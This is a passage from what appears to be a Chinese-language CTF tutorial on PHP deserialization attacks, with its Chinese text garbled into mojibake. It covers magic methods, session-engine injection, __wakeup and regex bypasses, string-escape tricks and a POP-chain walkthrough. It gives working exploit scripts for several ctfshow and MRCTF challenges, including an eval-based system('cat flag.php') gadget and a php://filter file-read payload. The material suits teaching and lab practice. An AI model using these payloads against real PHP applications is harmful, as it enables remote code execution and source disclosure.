å±æ€§åºåˆ—åŒ–ï¼Œè€Œnameå¹¶æ²¡æœ‰è¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥å¯ä»¥åœ¨__sleep()æ–¹æ³•é‡Œå†³å®šå“ªäº›å±æ€§è¢«åºåˆ—åŒ–ã€‚ 0x05 è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ æ ¹æ®è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„ä¸åŒ åºåˆ—åŒ–åçš„ å±æ€§é•¿åº¦å’Œå±æ€§å€¼ä¼šæœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥è¿™é‡Œç®€å•æä¸€ä¸‹ public(å…¬æœ‰) protected(å—ä¿æŠ¤) // %00*%00å±æ€§å private(ç§æœ‰çš„) // %00ç±»å%00å±æ€§å protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ**%00*%00å±æ€§å** privateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ**%00ç±»å%00å±æ€§å** ï¼ˆ%00ä¸ºç©ºç™½ç¬¦ï¼Œç©ºå­—ç¬¦ä¹Ÿæœ‰é•¿åº¦ï¼Œä¸€ä¸ªç©ºå­—ç¬¦é•¿åº¦ä¸º 1ï¼‰ å®ä¾‹ï¼š &lt;?php class Ctf{ public $name='Sch0lar'; protected $age='19'; private $flag='get flag'; } $ctfer=new Ctf(); //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ echo serialize($ctfer); ?&gt; //è¾“å‡ºç»“æœ O:3:\"Ctf\":3:{s:4:\"name\";s:7:\"Sch0lar\";s:6:\"*age\";s:2:\"19\";s:9:\"Ctfflag\";s:8:\"get flag\";} å¯ä»¥çœ‹åˆ° s:6:\"*age\" //*å‰åå‡ºç°ä¸¤ä¸ªç©ºç™½ç¬¦ï¼Œä¸€ä¸ªç©ºç™½ç¬¦é•¿åº¦ä¸º1ï¼Œæ‰€ä»¥åºåˆ—åŒ–åï¼Œè¯¥å±æ€§é•¿åº¦ä¸º6 s:9:\"Ctfflag\" //ç±»åCtfå‰åå‡ºç°ä¸¤ä¸ª%00ç©ºç™½ç¬¦ï¼Œæ‰€ä»¥é•¿åº¦ä¸º9 0x06 PHP-ååºåˆ—åŒ– 6.1 å¸¸è§çš„PHPé­”æœ¯æ–¹æ³• __construct()ï¼Œç±»çš„æ„é€ å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œååºåˆ—åŒ–ä¸è§¦å‘ __destruct()ï¼Œç±»çš„ææ„å‡½æ•°ï¼Œä½†å¦‚æœç¨‹åºæŠ¥é”™æˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³• __call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ __callStatic()ï¼Œåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è°ƒç”¨ __get()ï¼Œè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶è°ƒç”¨ __set()ï¼Œåœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶è°ƒç”¨ __isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()å’Œempty()æ—¶ï¼Œ__isset()è¢«è°ƒç”¨ __unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶ï¼Œ__unset()ä¼šè¢«è°ƒç”¨ __sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• __invoke()ï¼Œå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __set_state()ï¼Œå½“è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ __clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨ __debuginfo()ï¼Œå½“è½¬å‚¨å¯¹è±¡ä»¥è·å–åº”æ˜¾ç¤ºçš„å±æ€§æ—¶ï¼Œä¼šè¢«è°ƒç”¨ __autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±» __serialize()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°(è¿™ä¸ªå’Œ__sleep()çš„åŒºåˆ«åé¢ä¼šè¯¦ç»†ä»‹ç») __unserialize()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°(è¿™ä¸ªå’Œ__wakeup()çš„åŒºåˆ«åé¢ä¼šè¯¦ç»†ä»‹ç») ååºåˆ—åŒ–å‡½æ•°unserialize()ã€‚ååºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªåºåˆ—åŒ–äº†çš„å¯¹è±¡æˆ–æ•°ç»„å­—ç¬¦ä¸²ï¼Œè¿˜åŸå›å» ä¸åºåˆ—åŒ–å‡½æ•°ç±»ä¼¼ï¼Œunserialize()ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ª__wakeupé­”æœ¯æ–¹æ³• å¦‚æœå­˜åœ¨åˆ™ä¼šå…ˆè°ƒç”¨__wakeup()æ–¹æ³•ï¼Œå†è¿›è¡Œåºåˆ—åŒ– å¯ä»¥åœ¨__wakeup()æ–¹æ³•ä¸­å¯¹å±æ€§è¿›è¡Œåˆå§‹åŒ–ã€èµ‹å€¼æˆ–è€…æ”¹å˜ã€‚ ååºåˆ—åŒ–ä¹‹å‰é‡æ–°ç»™flagå±æ€§èµ‹å€¼ // è¾“å‡ºç»“æœ object(Ctf)#2 (3) { [\"flag\"]=&gt; string(13) \"no flag\" [\"name\"]=&gt; string(7) \"Sch0lar\" [\"age\"]=&gt; string(2) \"18\" } 6.2 æ¼æ´æˆå›  åŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQLæ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚ åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚ æ¼æ´è§¦å‘æ¡ä»¶ï¼š unserializeå‡½æ•°çš„å‚æ•°ã€å˜é‡å¯æ§ï¼Œphpæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³• è€Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸­å­˜åœ¨é­”æ³•å‡½æ•°ï¼Œä½¿ç”¨unserialize()å‡½æ•°åŒæ—¶ä¹Ÿä¼šè§¦å‘ã€‚è¿™æ ·ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶unserialize()å…¥å£ï¼Œé‚£ä¹ˆå°±å¯èƒ½å¼•å‘å¯¹è±¡æ³¨å…¥æ¼æ´ã€‚ 6.3 åºåˆ—åŒ–å¼•æ“ phpå¯¹sessionçš„å¤„ç†æœ‰ä¸‰ç§å¼•æ“åˆ†åˆ«ä¸ºphpã€php_serializeã€php_binary.ç»è¿‡è¿™ä¸‰è€…å¤„ç†åçš„sessionç»“æ„éƒ½ä¸ç›¸åŒã€‚ php_serialize\t-&gt;ä¸serializeå‡½æ•°åºåˆ—åŒ–åçš„ç»“æœä¸€è‡´ php -&gt;key|serializeåçš„ç»“æœ php_binary -&gt;é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+serialize()å‡½æ•°åºåˆ—åŒ–çš„å€¼ é»˜è®¤ä½¿ç”¨phpå¼•æ“ ä½¿ç”¨phpå¼•æ“çš„ç»“æœï¼š ä½¿ç”¨php_serializeå¼•æ“çš„ç»“æœï¼š ä½¿ç”¨php_binaryå¼•æ“çš„ç»“æœå¦‚ä¸‹ å…¶ä¸­å­˜åœ¨ä¸å¯è§å­—ç¬¦ï¼Œå°†ç»“æœè¿›è¡ŒURLç¼–ç å¦‚ä¸‹ åœ¨sessionæ–‡ä»¶å¯å†™çš„æƒ…å†µä¸‹ï¼Œå¯æ‰‹åŠ¨å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å†…å®¹,ä¾‹å¦‚ &lt;?php ini_set('open_basedir','/var/www/html'); session_save_path('/var/www/html'); session_start(); highlight_file(__FILE__); include \"flag.php\"; $banner = \"--4ut15m-- \"; if($_SESSION['name']==='admin'){ echo $flag.\"&lt;br&gt;\"; }else if(isset($_GET['name']) &amp;&amp; isset($_GET['content'])){ if(preg_match('/ph/i',$_GET['name'])){ var_dump($_GET['name']); die('over'); }else file_put_contents('/var/www/html/'.$_GET['name'],$banner . $_GET['content']); } ?&gt; è¯¥é¢˜ç›®ä¸­å¯ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œæ•…å†™å…¥sessionæ–‡ä»¶æ„é€ name=admin.payload=|s:3:\"xxx\";name|s:5:\"admin\"; ç®€å•è¯´ä¸€ä¸‹payload. bannerå’Œpayloadæ‹¼æ¥åœ¨ä¸€èµ·åå˜ä¸º--4ut15m-- |s:3:\"xxx\";name|s:5:\"admin\";ç»phpåºåˆ—åŒ–å¼•æ“ååºåˆ—åŒ–åå°±æˆä¸ºäº† $_SESSION=['--4ut15m-- ' =&gt; 'xxx', 'name' =&gt; 'admin'] 0x07 ååºåˆ—åŒ–ç»•è¿‡å°Trick 7.1 php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ æˆ‘ä»¬å‰é¢è¯´äº†å¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåºåˆ—åŒ–ç»“æœä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00*\\x00 ä½†åœ¨ç‰¹å®šç‰ˆæœ¬7.1ä»¥ä¸Šåˆ™å¯¹äºç±»å±æ€§ä¸æ•æ„Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­å³ä½¿æ²¡æœ‰\\x00*\\x00ä¹Ÿä¾ç„¶ä¼šè¾“å‡ºabc &lt;?php class test{ protected $a; public function __construct(){ $this-&gt;a = 'abc'; } public function __destruct(){ echo $this-&gt;a; } } unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'); ?&gt; 7.2 ç»•è¿‡__wakeup ç‰ˆæœ¬ï¼š â€‹ PHP5 &lt; 5.6.25 â€‹ PHP7 &lt; 7.0.10 åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ ä¾‹ï¼š &lt;?php class test{ public $a; public function __construct(){ $this-&gt;a = 'abc'; } public function __wakeup(){ $this-&gt;a='666'; } public function __destruct(){ echo $this-&gt;a; } } å¦‚æœæ‰§è¡Œunserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}');è¾“å‡ºç»“æœä¸º666 è€ŒæŠŠå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¢å¤§æ‰§è¡Œunserialize('O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";}');è¾“å‡ºç»“æœä¸ºabc 7.3 ç»•è¿‡éƒ¨åˆ†æ­£åˆ™ æ­£åˆ™è¡¨è¾¾å¼ï¼šæè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹ é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰ã€‚ preg_match('/^O:\\d+/') //åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´ï¼Œ+å·å¯ä»¥å®ç°ç»•è¿‡ï¼ˆ+å·ä»£è¡¨ç©ºæ ¼ï¼‰ //å¦å¤–ååºåˆ—åŒ–åœ¨é‡åˆ°+å·æ—¶ä¹Ÿä¼šè‡ªåŠ¨é€€å‡ºååºåˆ—åŒ–è¿›ç¨‹ åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆåœ¨urlä¼ å‚æ—¶æ³¨æ„+ç¼–ç ä¸º%2Bï¼‰ serialize(array( a ) ) aä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡(åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„) &lt;?php class test{ public $a; public function __construct(){ $this-&gt;a = 'abc'; } public function __destruct(){ echo $this-&gt;a.PHP_EOL; } } function match($data){ if (preg_match('/^O:\\d+/',$data)){ die('you lose!'); }else{ return $data; } } $a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'; // +å·ç»•è¿‡ $b = str_replace('O:4','O:+4', $a); unserialize(match($b)); // serialize(array($a)); unserialize('a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}}'); å¯¹åº” ctfshow web258 ç¼–å†™è„šæœ¬ï¼š &lt;?php class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'backDoor'; public function __construct(){ $this-&gt;class=new backDoor(); } public function __destruct(){ $this-&gt;class-&gt;getInfo(); } } class backDoor{ public $code='system(\"cat flag.php\");'; public function getInfo(){ eval($this-&gt;code); } } $a = new ctfShowUser(); $a = serialize($a); $a= str_replace('O:', 'O:+',$a);//ç»•è¿‡preg_match echo urlencode($a); ?&gt; //ä¸»è¦æ˜¯è°ƒç”¨backDooræ‰§è¡Œevalå‘½ä»¤å‡½æ•°è·å–flag 7.4 åˆ©ç”¨å¼•ç”¨ &lt;?php class test{ public $a; public $b; public function __construct(){ $this-&gt;a = 'abc'; $this-&gt;b= &amp;$this-&gt;a; } public function __destruct(){ if($this-&gt;a===$this-&gt;b){ echo 666; } } } $a = serialize(new test()); ä¸Šé¢è¿™ä¸ªä¾‹å­å°†$bè®¾ç½®ä¸º$açš„å¼•ç”¨ï¼Œå¯ä»¥ä½¿$aæ°¸è¿œä¸$bç›¸ç­‰ å¯¹åº”äºctfshow 265 è„šæœ¬ä»£ç ï¼š &lt;?php class ctfshowAdmin{ public $token; public $password; public function __construct($t,$p){ $this-&gt;token=$t; $this-&gt;password = &amp;$this-&gt;token; } public function login(){ return $this-&gt;token===$this-&gt;password; } } $a = serialize(new ctfshowAdmin('123','123')); echo urlencode($a); ?&gt; 7.5 16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤ O:4:\"test\":2:{s:4:\"%00*%00a\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} å¯ä»¥å†™æˆ O:4:\"test\":2:{S:4:\"\\00*\\00\\61\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚ 61(16è¿›åˆ¶)-&gt;97(åè¿›åˆ¶)-&gt;a(ASCII) &lt;?php class test{ public $username; public function __construct(){ $this-&gt;username = 'admin'; } public function __destruct(){ echo 666; } } function check($data){ if(stristr($data, 'username')!==False){ echo(\"ä½ ç»•ä¸è¿‡ï¼ï¼\".PHP_EOL); } else{ return $data; } } // æœªä½œå¤„ç†å‰ $a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}'; $a = check($a); unserialize($a); // åšå¤„ç†å \\75æ˜¯uçš„16è¿›åˆ¶ $a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}'; $a = check($a); unserialize($a); 7.6 PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ 1.è¿‡æ»¤åå­—ç¬¦å˜å¤šï¼ˆååºåˆ—åŒ–åçš„ä¸€ä¸ªxæ›¿æ¢æˆä¸ºä¸¤ä¸ªï¼‰ &lt;?php function change($str){ return str_replace(\"x\",\"xx\",$str); } $name = $_GET['name']; $age = \"I am 11\"; $arr = array($name,$age); echo \"ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š\"; var_dump(serialize($arr)); echo \"&lt;br/&gt;\"; echo \"è¿‡æ»¤å:\"; $old = change(serialize($arr)); $new = unserialize($old); var_dump($new); echo \"&lt;br/&gt;æ­¤æ—¶ï¼Œage=$new[1]\"; ?&gt; æ­£å¸¸è¾“å‡ºå¦‚ä¸‹ æ·»åŠ ä¸€ä¸ªxçœ‹çœ‹ï¼š è¿™ä¸ªå°±æ˜¯å°†GETä¼ å…¥çš„nameä¸­çš„ x æ”¹ä¸ºäº† xxï¼Œæ­£å¸¸ä¼ å…¥ä¸å«xçš„nameå€¼å°±ä¼šæ­£å¸¸æ˜¾ç¤º ä¾‹å¦‚ï¼š?name=maoï¼Œæ­¤æ—¶é•¿åº¦ä¸º3 å¦‚æœæˆ‘ä»¬ä¼ å…¥maoxï¼Œæ­£å¸¸æƒ…å†µä¸‹ä»–çš„é•¿åº¦å°±æ˜¯4ï¼Œä½†æ˜¯ç»è¿‡changeå‡½æ•°çš„æ›¿æ¢ï¼Œå˜æˆäº†abcxxï¼Œå¯¼è‡´æº¢å‡ºï¼ˆé•¿åº¦å¤§äº4ï¼‰è¿›è€Œå½±å“ä¸‹é¢çš„ååºåˆ—åŒ– æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å®ç°å­—ç¬¦ä¸²é€ƒé€¸ æ„é€ ï¼š ?name=abcxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"whoami\";} è¾“å‡ºå¦‚ä¸‹ï¼š è§£é‡Šï¼š å½“æˆ‘ä»¬æ„é€ nameæ—¶ï¼Œåœ¨abcåå†™18ä¸ªxï¼Œè€Œä¸”åé¢ \";i:1;s:4:â€œflagâ€;} ä¹Ÿæ˜¯18çš„é•¿åº¦ï¼›åœ¨è¿›è¡Œchangeæ—¶ï¼Œè¿™é‡Œçš„18ä¸ªxå°±å˜æˆäº†36ä¸ªxï¼Œåˆšå¥½ç¬¦åˆåºåˆ—åŒ–æ—¶çš„é•¿åº¦ï¼Œä»è€Œé€ æˆ \";i:1;s:4:â€œflagâ€;} æº¢å‡ºï¼Œå‰é¢çš„\"é—­åˆå‰ä¸²ï¼Œåé¢çš„;}é—­åˆååºåˆ—åŒ–çš„å…¨è¿‡ç¨‹ï¼Œè€Œå…ˆå‰å­˜åœ¨çš„$ageè¢«èˆå¼ƒï¼ˆå› ä¸ºè¿™é‡Œæ•°ç»„åªæœ‰ä¸¤ä¸ªå…ƒç´ ï¼‰ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„è¿‡ç¨‹ æ€»ä¹‹ï¼Œageå˜é‡è¢«æˆ‘ä»¬æ§åˆ¶ 2.è¿‡æ»¤åå­—ç¬¦å˜å°‘(æŠŠååºåˆ—åŒ–åçš„ä¸¤ä¸ªxæ›¿æ¢æˆä¸ºä¸€ä¸ª) &lt;?php function change($str){ return str_replace(\"xx\",\"x\",$str); } $arr['name'] = $_GET['name']; $arr['age'] = $_GET['age']; echo \"ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š\"; var_dump(serialize($arr)); echo \"&lt;br/&gt;\"; echo \"è¿‡æ»¤å:\"; $old = change(serialize($arr)); var_dump($old); echo \"&lt;br/&gt;\"; $new = unserialize($old); var_dump($new); echo \"&lt;br/&gt;æ­¤æ—¶ï¼Œage=\"; echo $new['age']; æ„é€ ï¼š ?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11\";s:3:\"age\";s:6:\"whoami\";} è¿™é‡Œçš„40ä¸ªxç»è¿‡æ»¤åå°±å˜ä¸ºäº†20ä¸ªxï¼Œä½†æ˜¯åœ¨å‰é¢çš„é•¿åº¦è¿˜æ˜¯40ï¼Œæ‰€ä»¥åé¢çš„20ä¸ªå­—ç¬¦è¢«â€åƒæ‰â€œ æ³¨æ„ \";s:3:â€œageâ€;s:28: è¿™ä¸€éƒ¨åˆ†æœ¬æ¥å°±æœ‰ï¼Œåé¢çš„ ;s:3:â€œageâ€;s:6:â€œwhoamiâ€;} ä¸ºæˆ‘ä»¬æ‰€æ„é€ çš„ ageè¢«æˆ‘ä»¬æ§åˆ¶ ctfshow web262 è„šæœ¬ï¼š &lt;?php class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; } } function filter($msg){ return str_replace('fuck', 'loveU', $msg); } $msg = new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";}','b','c'); $msg_1 = serialize($msg); echo $msg_1; $msg_2 =filter($msg_1); echo $msg_2; //O:7:\"message\":4:{s:4:\"from\";s:310:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";}\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";} ?&gt; 0x08 å¯¹è±¡æ³¨å…¥ å¯¹è±¡æ³¨å…¥ å½“ç”¨æˆ·çš„è¯·æ±‚åœ¨ä¼ ç»™ååºåˆ—åŒ–å‡½æ•° unserialize() ä¹‹å‰æ²¡æœ‰è¢«æ­£ç¡®çš„è¿‡æ»¤æ—¶å°±ä¼šäº§ç”Ÿæ¼æ´ã€‚å› ä¸ºPHPå… è®¸å¯¹è±¡åºåˆ—åŒ–ï¼Œæ”»å‡»è€…å°±å¯ä»¥æäº¤ç‰¹å®šçš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ç»™ä¸€ä¸ªå…·æœ‰è¯¥æ¼æ´çš„ unserialize å‡½æ•°ï¼Œæœ€ç»ˆ å¯¼è‡´ä¸€ä¸ªåœ¨è¯¥åº”ç”¨èŒƒå›´å†…çš„ä»»æ„PHPå¯¹è±¡æ³¨å…¥ã€‚ å‰æéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ 1ã€unserializeçš„å‚æ•°å¯æ§ã€‚ 2ã€ä»£ç é‡Œæœ‰å®šä¹‰ä¸€ä¸ªå«æœ‰é­”æœ¯æ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•é‡Œå‡ºç°ä¸€äº›ä½¿ç”¨ç±»æˆå‘˜å˜é‡ä½œä¸ºå‚æ•°çš„å­˜åœ¨å®‰å…¨é—®é¢˜çš„å‡½ æ•°ã€‚ &lt;?php class A{ public $test = \"12345\"; function __destruct(){ echo $this-&gt;test; } } $a = 'O:1:\"A\":1:{s:4:\"test\";s:5:\"23456\";}'; unserialize($a); ?&gt; è„šæœ¬ç»“æŸæ—¶ä¼šè°ƒç”¨**__destruct()å‡½æ•°**ï¼ŒåŒæ—¶ä¼šè¦†ç›–testå˜é‡è¾“å‡º 23456 0x09 POPé“¾ç®€å•ä»‹ç» å‰é¢æ‰€è®²è§£çš„åºåˆ—åŒ–æ”»å‡»æ›´å¤šçš„æ˜¯é­”æœ¯æ–¹æ³•ä¸­å‡ºç°ä¸€äº›åˆ©ç”¨çš„æ¼æ´ï¼Œå› ä¸ºè‡ªåŠ¨è°ƒç”¨è€Œè§¦å‘æ¼æ´ï¼Œä½†å¦‚æœå…³é”®ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å¯ä»¥é€šè¿‡å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ ç®€å•æ¡ˆä¾‹MRCTF2020-Ezpop &lt;?php class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ $this-&gt;append($this-&gt;var); } } $a $b class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ //å½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æˆ–è€…æ˜¯æ— æ³•è®¿é—®çš„å±æ€§çš„æ—¶å€™è¢«è°ƒç”¨ $function = $this-&gt;p; return $function(); } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']); } else{ $a=new Show; highlight_file(__FILE__); } ?&gt; å…±æœ‰3ä¸ªç±»ï¼Œååºåˆ—åŒ–ä¼šè°ƒç”¨__wakeupï¼Œå­˜åœ¨äºShowç±»__wakeä¸­çš„$this-&gt;sourceå¯æ§ï¼Œä¹Ÿå°±æ˜¯Showä¸­$sourceå˜é‡å¯æ§ æ€è·¯ï¼šå°†$sourceæ„é€ æˆä¸€ä¸ªå¯¹è±¡Showï¼Œå½“$sourceä¸ºä¸€ä¸ªå¯¹è±¡æ—¶ã€‚å°±ä¼šæ‰§è¡ŒShowç±»ä¸­çš„__toString æ­¤æ—¶å°†$stræŒ‡å‘Testç±» $this-&gt;str-&gt;sourceï¼šå–strç±»ä¸­çš„sourceå€¼ï¼Œä½¿è¿™ä¸ªå€¼è‡ªåŠ¨è°ƒç”¨__get æ­¤æ—¶å°†$pæ„é€ æˆnew Modifier return $function() è¡¨ç¤ºå°†functionå½“ä½œå‡½æ•°è¿”å› å½“ç±»å˜é‡ç›´æ¥å½“ä½œå‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•__invoke ç„¶åå°†$varæ„é€ æˆè¯»å–æºç å³å¯ $var = 'php://filter/read=convert.base64-encode/recource=flag.php'; payloadï¼š &lt;?php ini_set('memory_limit','-1'); class Modifier { protected $var = 'php://filter/read=convert.base64- encode/resource=flag.php'; } class Show{ public $source; public $str; public function __construct($file){ $this-&gt;source = $file; $this-&gt;str = new Test(); } } class Test{ public $p; public function __construct(){ $this-&gt;p = new Modifier(); } } $a = new Show('aaa'); $a = new Show($a); echo urlencode(serialize($a)); ?&gt; æ¥è‡ªï¼šhttps://www.bilibili.com/video/av4142669 0x10 PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•éå†ä¸€ä¸‹PHPçš„å†…ç½®ç±»ï¼š &lt;?php $classes = get_declared_classes(); //è¿”å›ç”±å·²å®šä¹‰ç±»çš„åå­—æ‰€ç»„æˆçš„æ•°ç»„ foreach ($classes as $class) { $methods = get_class_methods($class); 